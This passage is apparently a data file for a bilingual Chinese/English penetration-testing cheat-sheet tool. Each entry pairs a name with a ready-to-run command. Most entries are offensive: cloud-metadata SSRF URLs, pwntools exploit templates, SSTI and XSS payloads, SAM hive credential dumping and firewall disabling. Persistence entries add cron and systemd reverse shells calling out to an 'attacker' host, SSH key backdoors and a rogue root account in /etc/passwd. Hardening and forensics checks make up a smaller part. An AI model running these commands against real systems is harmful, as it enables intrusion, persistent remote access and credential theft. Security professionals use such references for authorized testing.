      { name: { zh: 'Cloud SSRF', en: 'Cloud metadata SSRF' }, command: "# AWS\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n# GCP\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ (需要 Metadata-Flavor: Google)\n# Azure\nhttp://169.254.169.254/metadata/identity/oauth2/token (需要 Metadata: true)", description: { zh: '云平台元数据 SSRF', en: 'Cloud platform metadata SSRF' }, platform: 'all' }
    ],
    references: ['https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery']
  },
  {
    id: 'ctf-pwn-techniques',
    name: { zh: 'CTF PWN 技术速查', en: 'CTF PWN Techniques Quick Reference' },
    description: { zh: 'CTF PWN 题目常见利用技术速查', en: 'Quick reference for common CTF PWN challenge exploitation techniques' },
    category: { zh: 'CTF/PWN', en: 'CTF / PWN' },
    commands: [
      { name: { zh: '栈溢出模板', en: 'Stack overflow template' }, command: "from pwn import *\np = process('./pwn')\n# 1. 找偏移\npayload = cyclic(200)\np.sendline(payload)\ncore = p.corefile\noffset = cyclic_find(core.fault_addr & 0xffffffff)\nprint(f'Offset: {offset}')\n# 2. 构造 payload\np = process('./pwn')\nrop = ROP(ELF('./pwn'))\npayload = b'A'*offset + p64(rop.ret.address) + p64(rop.rdi.address) + ...)", description: { zh: '栈溢出 ROP 利用模板', en: 'Stack overflow ROP exploitation template' }, platform: 'linux' },
      { name: { zh: '格式化字符串模板', en: 'Format string template' }, command: "from pwn import *\np = process('./fmt')\n# 泄露地址\npayload = b'%p.'*20\np.sendline(payload)\n# 写入地址\npayload = fmtstr_payload(6, {target_addr: value})\np.sendline(payload)", description: { zh: '格式化字符串漏洞利用模板', en: 'Format string vulnerability exploitation template' }, platform: 'linux' },
      { name: { zh: '堆利用模板', en: 'Heap exploitation template' }, command: "from pwn import *\n# tcache poisoning (glibc 2.27-2.31)\n# 1. free chunk A twice (tcache dup)\n# 2. alloc, write fake fd = target\n# 3. alloc twice -> get target chunk\n# House of Spirit, Unsorted Bin Attack, etc.", description: { zh: '堆漏洞利用思路速查', en: 'Heap exploitation strategy reference' }, platform: 'linux' },
      { name: { zh: '保护机制检查', en: 'Security check' }, command: "checksec --file=./binary\n# NX: 不可执行栈 → 需要 ROP\n# PIE: 地址随机化 → 需要泄露基址\n# Canary: 栈保护 → 需要泄露/绕过\n# RELRO: GOT 保护 → Full RELRO 无法覆写 GOT", description: { zh: '二进制保护机制对应利用方向', en: 'Binary protection mechanisms and exploitation approaches' }, platform: 'linux' }
    ],
    references: ['https://docs.pwntools.com/en/stable/']
  },


  {
    id: 'iot-security',
    name: { zh: 'IoT 设备安全测试', en: 'IoT Device Security Testing' },
    description: { zh: 'IoT 设备固件分析和漏洞测试命令', en: 'IoT device firmware analysis and vulnerability testing commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: '固件下载提取', en: 'Firmware download extraction' }, command: "binwalk -Me firmware.bin\n# 挂载文件系统\nmount -o loop,offset=xxx rootfs.squashfs /mnt\n# 模拟执行\nqemu-arm-static /mnt/bin/busybox", description: { zh: 'IoT 固件分析', en: 'IoT firmware analysis' }, platform: 'linux' },
      { name: { zh: '默认凭证测试', en: 'Default credential testing' }, command: '# 路由器常见默认凭证\nadmin/admin, admin/password, admin/1234\nroot/root, admin/(blank)\n# 数据库: https://www.routerpasswords.com/', description: { zh: 'IoT 设备默认凭证', en: 'IoT device default credentials' }, platform: 'all' },
      { name: { zh: 'MQTT 测试', en: 'MQTT testing' }, command: 'mosquitto_sub -h target -t "#" -v\nmosquitto_pub -h target -t "test" -m "hello"\n# 认证绕过\nmosquitto_sub -h target -t "#" -u "" -P ""', description: { zh: 'MQTT 协议安全测试', en: 'MQTT protocol security testing' }, platform: 'linux' },
      { name: { zh: 'Shodan IoT 搜索', en: 'Shodan IoT search' }, command: 'port:23 telnet\nport:80 "Server: mini_httpd"\nproduct:"Hikvision"\ncountry:CN port:8080 "DVR"\nport:554 rtsp', description: { zh: 'Shodan 搜索 IoT 设备', en: 'Search IoT devices on Shodan' }, platform: 'all' }
    ],
    references: ['https://github.com/ReFirmLabs/binwalk']
  },
  {
    id: 'social-media-osint',
    name: { zh: '社交媒体 OSINT', en: 'Social Media OSINT' },
    description: { zh: '社交媒体和人员情报收集命令', en: 'Social media and personnel intelligence gathering commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'Sherlock 用户名', en: 'Sherlock username search' }, command: 'python3 sherlock.py username\npython3 sherlock.py username --timeout 5 --output results.txt', description: { zh: '跨平台用户名搜索', en: 'Cross-platform username search' }, platform: 'all' },
      { name: { zh: 'Maltego 图谱', en: 'Maltego relationship mapping' }, command: 'maltego\n# 实体: Person/Email/Phone/Domain\n# 变换: Email→Social/Domain→Org', description: { zh: 'Maltego 情报关系图', en: 'Maltego intelligence relationship mapping' }, platform: 'all' },
      { name: { zh: 'LinkedIn 枚举', en: 'LinkedIn enumeration' }, command: "# LinkedInt 工具\npython LinkedInt.py -u email@corp.com -c company.txt\n# Google Dork\nsite:linkedin.com \"company\" \"employee\"\nsite:linkedin.com/in/ \"target corp\"", description: { zh: 'LinkedIn 员工信息收集', en: 'LinkedIn employee information gathering' }, platform: 'all' }
    ],
    references: ['https://github.com/sherlock-project/sherlock']
  },
  {
    id: 'persistence-techniques',
    name: { zh: '持久化技术速查', en: 'Persistence Techniques Quick Reference' },
    description: { zh: 'Linux/Windows 多种持久化技术命令', en: 'Linux/Windows persistence technique commands' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: 'Linux SSH 后门', en: 'Linux SSH backdoor' }, command: 'mkdir -p ~/.ssh\necho "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\n# 系统级\necho "attacker_key" >> /root/.ssh/authorized_keys', description: { zh: 'SSH 公钥持久化', en: 'SSH public key persistence' }, platform: 'linux' },
      { name: { zh: 'Linux Cron 后门', en: 'Linux cron backdoor' }, command: '(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1") | crontab -\necho "*/5 * * * * root bash -c \'bash -i >& /dev/tcp/attacker/4444 0>&1\'" >> /etc/crontab', description: { zh: 'Crontab 反弹 Shell 持久化', en: 'Crontab reverse shell persistence' }, platform: 'linux' },
      { name: { zh: 'Linux systemd 服务', en: 'Linux systemd service' }, command: "cat > /etc/systemd/system/evil.service << 'EOF'\n[Unit]\nDescription=evil\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable evil && systemctl start evil", description: { zh: 'Systemd 服务持久化', en: 'Systemd service persistence' }, platform: 'linux' },
      { name: { zh: 'Windows 注册表', en: 'Windows registry persistence' }, command: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\evil.exe" /f\n# 所有用户\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "C:\\evil.exe" /f', description: { zh: 'Windows 注册表启动项持久化', en: 'Windows registry run key persistence' }, platform: 'windows' },
      { name: { zh: 'Windows 计划任务', en: 'Windows scheduled task' }, command: 'schtasks /create /tn "WindowsUpdate" /tr "C:\\evil.exe" /sc onlogon /ru SYSTEM\nschtasks /create /tn "WinDef" /tr "C:\\evil.exe" /sc minute /mo 5', description: { zh: 'Windows 计划任务持久化', en: 'Windows scheduled task persistence' }, platform: 'windows' }
    ],
    references: ['https://attack.mitre.org/tactics/TA0003/']
  },
  {
    id: 'information-gathering-passive',
    name: { zh: '被动信息收集', en: 'Passive Information Gathering' },
    description: { zh: '不主动触碰目标的被动信息收集方法', en: 'Passive information gathering without touching the target' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'WHOIS/ASN 查询', en: 'WHOIS/ASN lookup' }, command: 'whois target.com\nwhois -h whois.radb.net AS12345\n# BGP 查询\ncurl https://api.bgpview.io/asn/12345/prefixes', description: { zh: 'WHOIS 和 ASN 信息查询', en: 'WHOIS and ASN information lookup' }, platform: 'all' },
      { name: { zh: '证书透明度', en: 'Certificate transparency' }, command: "curl 'https://crt.sh/?q=%25.target.com&output=json' | python3 -m json.tool | grep name_value | sort -u\ncurl 'https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names'", description: { zh: '通过证书透明度发现资产', en: 'Discover assets via certificate transparency' }, platform: 'all' },
      { name: { zh: '搜索引擎 Dork', en: 'Search engine dorking' }, command: 'site:target.com -www\nsite:target.com ext:pdf\n"@target.com" filetype:xls\n"target.com" "password"\ninurl:target.com login', description: { zh: '搜索引擎高级语法信息收集', en: 'Search engine advanced syntax information gathering' }, platform: 'all' },
      { name: { zh: 'Wayback Machine', en: 'Wayback Machine' }, command: 'curl "https://web.archive.org/cdx/search/cdx?url=target.com&output=text&fl=original&collapse=urlkey"\nwaybackurls target.com | grep -E "\\.(php|asp|aspx|env|bak)"', description: { zh: 'Wayback Machine 历史页面', en: 'Retrieve historical pages from Wayback Machine' }, platform: 'all' }
    ],
    references: ['https://www.osintframework.com/']
  },


  {
    id: 'web-enumeration-tools',
    name: { zh: 'Web 枚举工具速查', en: 'Web Enumeration Tools' },
    description: { zh: 'Web 应用功能点和隐藏内容枚举工具', en: 'Web application function enumeration and hidden content discovery tools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'robotstxt/sitemap', en: 'robots.txt / sitemap' }, command: "curl https://target.com/robots.txt\ncurl https://target.com/sitemap.xml\ncurl https://target.com/.well-known/security.txt", description: { zh: '爬取重要信息文件', en: 'Fetch important information files' }, platform: 'all' },
      { name: { zh: '备份文件发现', en: 'Backup file discovery' }, command: "ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .bak,.old,.orig,.backup,.zip,.tar.gz\ncurl https://target.com/index.php.bak", description: { zh: '发现备份和源码文件', en: 'Discover backup and source files' }, platform: 'all' },
      { name: { zh: '技术栈指纹', en: 'Technology fingerprinting' }, command: 'whatweb https://target.com\nwappalyzer --url https://target.com\nbuiltwith https://target.com\n# 响应头分析\ncurl -I https://target.com | grep -iE "Server|X-Powered-By|Via"', description: { zh: '识别目标技术栈', en: 'Identify target technology stack' }, platform: 'all' },
      { name: { zh: 'Param 发现', en: 'Parameter discovery' }, command: 'arjun -u https://target.com/search\nparamspider --domain target.com\ncurl https://target.com/page?a=1 -v 2>&1 | grep "Reflected"', description: { zh: 'HTTP 参数发现', en: 'HTTP parameter discovery' }, platform: 'all' }
    ],
    references: ['https://github.com/s0md3v/Arjun']
  },
  {
    id: 'cloud-misc-tools',
    name: { zh: '云平台杂项工具', en: 'Cloud Miscellaneous Tools' },
    description: { zh: '云环境渗透测试辅助工具命令', en: 'Auxiliary tool commands for cloud environment penetration testing' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    commands: [
      { name: { zh: 'CloudBrute', en: 'CloudBrute bucket discovery' }, command: 'cloudbrute -d target.com -k target -m storage\ncloudbrute -d target.com -k target -m app', description: { zh: '云存储桶和应用枚举', en: 'Cloud storage bucket and application enumeration' }, platform: 'all' },
      { name: { zh: 'S3Scanner', en: 'S3Scanner' }, command: 's3scanner scan --buckets target-bucket\ns3scanner dump --bucket target-bucket', description: { zh: 'S3 存储桶扫描和下载', en: 'S3 bucket scanning and dumping' }, platform: 'all' },
      { name: { zh: 'enumerate-iam', en: 'AWS IAM enumeration' }, command: 'python3 enumerate-iam.py --access-key AKIA... --secret-key ...\n# 自动枚举所有 IAM 权限', description: { zh: '枚举 AWS IAM 权限', en: 'Enumerate all AWS IAM permissions' }, platform: 'all' },
      { name: { zh: 'GrayhatWarfare', en: 'GrayhatWarfare S3 search' }, command: '# https://grayhatwarfare.com/\n# 搜索公开 S3 桶中的敏感文件\n# 支持文件名搜索', description: { zh: '搜索公开 S3 桶中的文件', en: 'Search files in public S3 buckets' }, platform: 'all' }
    ],
    references: ['https://github.com/initstring/cloud_enum']
  },
  {
    id: 'linux-priv-esc-check',
    name: { zh: 'Linux 提权检测清单', en: 'Linux Privilege Escalation Checklist' },
    description: { zh: 'Linux 提权向量快速检测命令', en: 'Quick detection commands for Linux privilege escalation vectors' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: '全面检测一键命令', en: 'Comprehensive check one-liner' }, command: "id; sudo -l; find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; ls /etc/cron.*; cat /etc/passwd | grep /bin/bash; ps aux | grep root", description: { zh: '一行命令快速枚举提权向量', en: 'One-liner quick enumeration of escalation vectors' }, platform: 'linux' },
      { name: { zh: 'writable /etc/passwd', en: 'Writable /etc/passwd' }, command: 'ls -la /etc/passwd\n# 如果可写\necho "hacker:$(openssl passwd -1 hacker):0:0:root:/root:/bin/bash" >> /etc/passwd\nsu hacker', description: { zh: '/etc/passwd 可写提权', en: 'Privilege escalation via writable /etc/passwd' }, platform: 'linux' },
      { name: { zh: 'PATH 注入', en: 'PATH injection' }, command: 'echo $PATH\n# 检查 sudo 允许执行的程序\nsudo -l\n# 若某个允许的程序内部调用了不带绝对路径的命令\ncd /tmp && echo "bash -p" > target_cmd && chmod +x target_cmd && sudo PATH=/tmp:$PATH /allowed_program', description: { zh: 'sudo PATH 注入提权', en: 'Privilege escalation via sudo PATH injection' }, platform: 'linux' }
    ],
    references: ['https://gtfobins.github.io/']
  },




  {
    id: 'web-advanced-attacks',
    name: { zh: 'Web 高级攻击技术', en: 'Advanced Web Attack Techniques' },
    description: { zh: 'SSTI、原型链污染、DOM XSS 等高级 Web 漏洞', en: 'SSTI, prototype pollution, DOM XSS, and other advanced web vulnerabilities' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'SSTI 各引擎 Payload', en: 'SSTI engine payloads' }, command: "# Jinja2 (Python)\n{{7*7}} → 49\n{{config.items()}} → 配置泄露\n{{''.__class__.__mro__[1].__subclasses__()}}\n# Twig (PHP)\n{{7*7}} / {{dump(app)}}\n# FreeMarker (Java)\n${7*7} / <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", description: { zh: 'SSTI 各模板引擎利用 Payload', en: 'SSTI exploitation payloads for various template engines' }, platform: 'all' },
      { name: { zh: 'DOM XSS 利用', en: 'DOM XSS exploitation' }, command: "# 常见 source\nlocation.hash, location.search, document.referrer\n# 常见 sink\ndocument.write(), innerHTML, eval(), location.href\n# Payload\n#<img src=x onerror=alert(1)>\n?q=<img src=x onerror=alert(document.domain)>", description: { zh: 'DOM XSS source/sink 分析', en: 'DOM XSS source/sink analysis' }, platform: 'all' },
      { name: { zh: 'GraphQL 深度利用', en: 'GraphQL deep exploitation' }, command: "# 批量查询 DoS\n[{\"query\":\"{users{id username email}}\"},...x1000]\n# 字段枚举\n{user{__typename id username password secret admin}}\n# 嵌套对象\n{orders{user{password}}}", description: { zh: 'GraphQL 越权和信息泄露', en: 'GraphQL authorization bypass and info disclosure' }, platform: 'all' },
      { name: { zh: '请求走私进阶', en: 'HTTP smuggling advanced' }, command: "# TE.CL\ncurl -s -X POST https://target.com/ -H 'Transfer-Encoding: chunked' -H 'Content-Length: 3' -d '6\r\nPREFIX\r\n0\r\n\r\n'\n# CL.TE\ncurl -X POST https://target.com/ -H 'Content-Length: 13' -H 'Transfer-Encoding: chunked' -d '0\\r\\n\\r\\nSMUGGLED'", description: { zh: 'HTTP 请求走私高级技术', en: 'Advanced HTTP request smuggling techniques' }, platform: 'all' }
    ],
    references: ['https://portswigger.net/web-security']
  },
  {
    id: 'linux-system-hardening-check',
    name: { zh: 'Linux 安全基线检查', en: 'Linux Security Baseline Check' },
    description: { zh: 'Linux 系统安全配置基线检查命令', en: 'Linux system security configuration baseline check commands' },
    category: { zh: '蓝队取证', en: 'Blue Team & DFIR' },
    commands: [
      { name: { zh: '账户安全', en: 'Account security' }, command: 'awk -F: "($3==0)" /etc/passwd  # uid=0 账户\nawk -F: "($2==\\"\\")" /etc/shadow  # 空密码账户\ncat /etc/sudoers | grep -v "^#"\npasswd -S -a | grep NP  # 无密码账户', description: { zh: '检查账户安全配置', en: 'Check account security configuration' }, platform: 'linux' },
      { name: { zh: '网络安全', en: 'Network security' }, command: 'ss -tlnp  # 监听端口\niptables -L -n -v  # 防火墙规则\nsysctl net.ipv4.ip_forward  # IP 转发\ncat /etc/hosts.allow /etc/hosts.deny  # TCP Wrappers', description: { zh: '检查网络安全配置', en: 'Check network security configuration' }, platform: 'linux' },
      { name: { zh: '服务和进程', en: 'Services and processes' }, command: 'systemctl list-units --type=service --state=running\nps aux --sort=-%cpu | head\nfind / -type f -perm /111 -newer /etc/passwd 2>/dev/null  # 新执行文件', description: { zh: '检查运行的服务和进程', en: 'Check running services and processes' }, platform: 'linux' },
      { name: { zh: 'SSH 配置', en: 'SSH configuration' }, command: 'sshd -T | grep -E "permitrootlogin|passwordauthentication|pubkeyauthentication"\ncat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"', description: { zh: '检查 SSH 安全配置', en: 'Check SSH security configuration' }, platform: 'linux' }
    ],
    references: ['https://www.cisecurity.org/benchmark/ubuntu_linux']
  },
  {
    id: 'windows-security-check',
    name: { zh: 'Windows 安全基线检查', en: 'Windows Security Baseline Check' },
    description: { zh: 'Windows 系统安全配置检查命令', en: 'Windows system security configuration check commands' },
    category: { zh: '蓝队取证', en: 'Blue Team & DFIR' },
    commands: [
      { name: { zh: '补丁状态', en: 'Patch status' }, command: 'wmic qfe list brief | sort\nGet-HotFix | Sort-Object InstalledOn -Descending\nsysteminfo | findstr "KB"', description: { zh: '检查系统补丁安装状态', en: 'Check system patch installation status' }, platform: 'windows' },
      { name: { zh: 'Defender 状态', en: 'Defender status' }, command: 'Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntispywareEnabled\nGet-MpThreatDetection | Select-Object -Last 10', description: { zh: '检查 Windows Defender 状态', en: 'Check Windows Defender status' }, platform: 'windows' },
      { name: { zh: '用户账户', en: 'User accounts' }, command: 'net user\nnet localgroup administrators\nGet-LocalUser | Where-Object Enabled -eq $true\nnet accounts', description: { zh: '检查用户账户配置', en: 'Check user account configuration' }, platform: 'windows' },
      { name: { zh: '开放端口和服务', en: 'Open ports and services' }, command: 'netstat -ano | findstr LISTENING\nGet-NetTCPConnection -State Listen\nGet-Service | Where-Object Status -eq Running', description: { zh: '检查开放端口和运行服务', en: 'Check open ports and running services' }, platform: 'windows' }
    ],
    references: ['https://www.cisecurity.org/benchmark/microsoft_windows_desktop']
  },
  {
    id: 'exploit-development',
    name: { zh: '漏洞利用开发', en: 'Exploit Development' },
    description: { zh: '二进制漏洞利用开发基础命令和技术', en: 'Binary exploit development foundation commands and techniques' },
    category: { zh: 'CTF/PWN', en: 'CTF / PWN' },
    commands: [
      { name: { zh: 'GDB Python 脚本', en: 'GDB Python script' }, command: "python3 -c \"import struct; payload = b'A'*offset + struct.pack('<Q', ret_addr); open('/tmp/p','wb').write(payload)\"\ngdb -q ./binary -ex 'run < /tmp/p'", description: { zh: 'GDB 配合 Python 自动化调试', en: 'Automated debugging with GDB and Python' }, platform: 'linux' },
      { name: { zh: '栈溢出偏移', en: 'Stack overflow offset' }, command: "python3 -c \"from pwn import *; print(cyclic(200))\" | ./binary\ndmesg | tail\npython3 -c \"from pwn import *; print(cyclic_find(0x61616166))\"", description: { zh: '使用 cyclic 确定溢出偏移量', en: 'Use cyclic to determine overflow offset' }, platform: 'linux' },
      { name: { zh: 'ret2libc', en: 'ret2libc attack' }, command: "# 1. 泄露 libc 函数地址\n# 2. 计算 libc 基址\n# 3. 计算 system 和 /bin/sh 偏移\nfrom pwn import *\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nlibc.address = leaked_puts - libc.sym['puts']", description: { zh: 'ret2libc 攻击模板', en: 'ret2libc attack template' }, platform: 'linux' },
      { name: { zh: 'pwntools 快速模板', en: 'pwntools quick template' }, command: "from pwn import *\ncontext.binary = elf = ELF('./pwn')\nlibc = ELF('./libc.so.6')\ngs = 'break main'\n# io = process(elf.path)\nio = remote('target', 1337)\nif args.GDB: gdb.attach(io, gs)\nio.interactive()", description: { zh: 'pwntools 完整利用脚本模板', en: 'Complete pwntools exploit script template' }, platform: 'linux' }
    ],
    references: ['https://docs.pwntools.com/']
  },


  {
    id: 'threat-intel-tools',
    name: { zh: '威胁情报工具', en: 'Threat Intelligence Tools' },
    description: { zh: '威胁情报查询和 IOC 分析工具命令', en: 'Threat intelligence query and IOC analysis tool commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'VirusTotal 查询', en: 'VirusTotal lookup' }, command: "curl -s 'https://www.virustotal.com/api/v3/files/HASH' -H 'x-apikey: YOUR_KEY'\ncurl -s 'https://www.virustotal.com/api/v3/ip_addresses/1.2.3.4' -H 'x-apikey: YOUR_KEY'", description: { zh: 'VirusTotal API 查询', en: 'VirusTotal API lookup' }, platform: 'all' },
      { name: { zh: 'AbuseIPDB 查询', en: 'AbuseIPDB lookup' }, command: "curl -s 'https://api.abuseipdb.com/api/v2/check?ipAddress=1.2.3.4&maxAgeInDays=90' -H 'Key: YOUR_API_KEY' -H 'Accept: application/json'", description: { zh: 'AbuseIPDB 恶意 IP 查询', en: 'AbuseIPDB malicious IP lookup' }, platform: 'all' },
      { name: { zh: 'AlienVault OTX', en: 'AlienVault OTX' }, command: "curl -H 'X-OTX-API-KEY: YOUR_KEY' https://otx.alienvault.com/api/v1/indicators/IPv4/1.2.3.4/general", description: { zh: 'AlienVault OTX IOC 查询', en: 'AlienVault OTX IOC lookup' }, platform: 'all' }
    ],
    references: ['https://www.virustotal.com/gui/']
  },


  {
    id: 'windows-cmd-advanced',
    name: { zh: 'Windows CMD 高级命令', en: 'Windows CMD Advanced Commands' },
    description: { zh: 'Windows 渗透测试高级 CMD 命令', en: 'Advanced Windows CMD commands for penetration testing' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: 'WMIC 信息收集', en: 'WMIC enumeration' }, command: 'wmic process list brief\nwmic service list brief\nwmic startup list full\nwmic logicaldisk get caption,filesystem,freespace,size\nwmic product get name,version', description: { zh: 'WMIC 系统信息枚举', en: 'WMIC system info enumeration' }, platform: 'windows' },
      { name: { zh: '端口管理', en: 'Port management' }, command: 'netstat -ano | findstr ":80 "\nnetsh interface portproxy show v4tov4\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=target', description: { zh: 'Windows 端口查看和转发', en: 'Windows port viewing and forwarding' }, platform: 'windows' },
      { name: { zh: '凭证导出', en: 'Credential dump' }, command: 'reg save HKLM\\SAM C:\\sam.hive\nreg save HKLM\\SYSTEM C:\\system.hive\nreg save HKLM\\SECURITY C:\\security.hive\n# 然后用 secretsdump.py 离线解析', description: { zh: '注册表凭证导出', en: 'Export credentials via registry' }, platform: 'windows' },
      { name: { zh: '防火墙操作', en: 'Firewall operations' }, command: 'netsh advfirewall set allprofiles state off\nnetsh advfirewall firewall add rule name="nc" dir=in action=allow protocol=tcp localport=4444\nnetsh advfirewall firewall delete rule name="nc"', description: { zh: 'Windows 防火墙快速操作', en: 'Quick Windows firewall operations' }, platform: 'windows' }
    ],
    references: ['https://ss64.com/nt/']
  },
  {
    id: 'linux-forensics-advanced',
    name: { zh: 'Linux 取证高级技术', en: 'Linux Advanced Forensics' },
    description: { zh: 'Linux 事件响应和取证高级命令', en: 'Advanced Linux incident response and forensics commands' },
    category: { zh: '蓝队取证', en: 'Blue Team & DFIR' },
    commands: [
      { name: { zh: '实时响应收集', en: 'Live response collection' }, command: 'date; hostname; id\nps auxf\nss -tlnp\nlast -F\ncat /var/log/auth.log | grep "Failed\\|Accepted" | tail -50\ncrontab -l; cat /etc/crontab', description: { zh: '应急响应快速信息收集', en: 'Quick info collection for incident response' }, platform: 'linux' },
      { name: { zh: '可疑文件查找', en: 'Find suspicious files' }, command: 'find / -type f -perm /111 -newer /etc/cron.daily -mtime -1 2>/dev/null\nfind /tmp /var/tmp /dev/shm -type f 2>/dev/null\nfind / -name ".* " -o -name ".. " 2>/dev/null  # 隐藏名称', description: { zh: '查找可疑的新建可执行文件', en: 'Find suspicious newly created executables' }, platform: 'linux' },
      { name: { zh: '网络取证', en: 'Network forensics' }, command: 'ss -antp\nlsof -i\ncat /proc/net/tcp\n# 捕获证据流量\ntcpdump -i any -w /tmp/evidence.pcap -c 1000', description: { zh: '网络连接取证收集', en: 'Network connection forensics collection' }, platform: 'linux' },
      { name: { zh: '进程分析', en: 'Process analysis' }, command: 'ls -la /proc/$(pgrep suspicious)/exe\ncat /proc/$(pgrep suspicious)/cmdline\nls -la /proc/$(pgrep suspicious)/fd\nstrings /proc/$(pgrep suspicious)/exe', description: { zh: '可疑进程深度分析', en: 'Deep analysis of suspicious process' }, platform: 'linux' }
    ],
    references: ['https://www.sans.org/posters/linux-knowledge-base-and-cheat-sheet/']
  },
  {
    id: 'secure-coding-flaws',
    name: { zh: '代码审计速查', en: 'Code Audit Quick Reference' },
    description: { zh: '代码安全审计常见漏洞模式速查', en: 'Common vulnerability pattern quick reference for code security audit' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'PHP 危险函数', en: 'PHP dangerous functions' }, command: 'grep -rn "eval\\|assert\\|preg_replace\\|call_user_func\\|system\\|exec\\|passthru\\|shell_exec\\|popen\\|proc_open" *.php\ngrep -rn "\\$_GET\\|\\$_POST\\|\\$_REQUEST\\|\\$_COOKIE" *.php | grep -v "htmlspecialchars\\|intval\\|filter_input"', description: { zh: '查找 PHP 代码危险调用', en: 'Find dangerous function calls in PHP code' }, platform: 'all' },
      { name: { zh: 'SQL 注入模式', en: 'SQL injection patterns' }, command: 'grep -rn "SELECT.*\\$\\|INSERT.*\\$\\|UPDATE.*\\$\\|DELETE.*\\$" *.php\ngrep -rn "mysql_query\\|pg_query\\|sqlite_query" *.php | grep "\\$"', description: { zh: '查找 SQL 注入风险代码', en: 'Find SQL injection risk code patterns' }, platform: 'all' },
      { name: { zh: 'Java 审计', en: 'Java audit' }, command: 'grep -rn "Runtime.getRuntime().exec\\|ProcessBuilder\\|ScriptEngine\\|ObjectInputStream\\|XMLDecoder" src/\ngrep -rn "request.getParameter\\|request.getAttribute" src/ | grep -v "validate\\|sanitize"', description: { zh: '查找 Java 代码危险调用', en: 'Find dangerous calls in Java code' }, platform: 'all' },
      { name: { zh: 'Node.js 审计', en: 'Node.js audit' }, command: "grep -rn \"eval(\\|new Function(\\|child_process\\|exec(\\|spawn(\" *.js\ngrep -rn \"req.query\\|req.body\\|req.params\" *.js | grep -v 'validate\\|sanitize\\|escape'", description: { zh: '查找 Node.js 代码危险调用', en: 'Find dangerous calls in Node.js code' }, platform: 'all' }
    ],
    references: ['https://owasp.org/www-project-code-review-guide/']
  },
  {
    id: 'misc-useful-commands',
    name: { zh: '渗透测试实用命令集', en: 'Useful Pentest Command Collection' },
    description: { zh: '渗透测试常用零散实用命令', en: 'Miscellaneous useful commands for penetration testing' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'URL 编解码', en: 'URL encoding/decoding' }, command: "python3 -c \"import urllib.parse; print(urllib.parse.quote('payload'))\"\npython3 -c \"import urllib.parse; print(urllib.parse.unquote('%27%20OR%201%3D1'))\"\n# curl\ncurl -G --data-urlencode 'q=SELECT * FROM users' http://target", description: { zh: 'URL 编解码工具', en: 'URL encoding and decoding tools' }, platform: 'all' },
      { name: { zh: '证书生成', en: 'Certificate generation' }, command: 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n# 自签名 HTTPS 服务器\nopenssl s_server -key key.pem -cert cert.pem -accept 4443 -www', description: { zh: '自签名证书生成', en: 'Self-signed certificate generation' }, platform: 'all' },
      { name: { zh: '流量生成', en: 'Traffic generation' }, command: 'ab -n 1000 -c 10 http://target/api\nhttperf --server target --port 80 --num-conns 100\ncurl -s -o /dev/null -w "%{time_total}" http://target', description: { zh: 'HTTP 性能测试和流量生成', en: 'HTTP performance testing and traffic generation' }, platform: 'linux' },
      { name: { zh: 'IP 范围计算', en: 'IP range calculation' }, command: 'python3 -c "import ipaddress; print(list(ipaddress.ip_network(\\"192.168.1.0/24\\").hosts()))"\nipcalc 192.168.1.0/24\nsipcalc -n 10.0.0.0/8', description: { zh: 'IP 网段计算', en: 'IP network range calculation' }, platform: 'all' }
    ],
    references: ['https://github.com/swisskyrepo/PayloadsAllTheThings']
  },


  {
    id: 'network-protocols',
    name: { zh: '网络协议渗透速查', en: 'Network Protocol Pentest Reference' },
    description: { zh: '常见网络协议渗透测试命令速查', en: 'Quick reference for common network protocol penetration testing' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'FTP 测试', en: 'FTP testing' }, command: 'ftp target\nnmap -p 21 --script ftp-anon,ftp-bounce,ftp-vuln-cve2010-4221 target\nhydra -l admin -P wordlist.txt ftp://target', description: { zh: 'FTP 服务渗透测试', en: 'FTP service penetration testing' }, platform: 'linux' },
      { name: { zh: 'SMTP 测试', en: 'SMTP testing' }, command: 'nmap -p 25 --script smtp-enum-users,smtp-open-relay target\ntelnet target 25\nswaks --to user@target --server target', description: { zh: 'SMTP 邮件服务测试', en: 'SMTP mail service testing' }, platform: 'linux' },
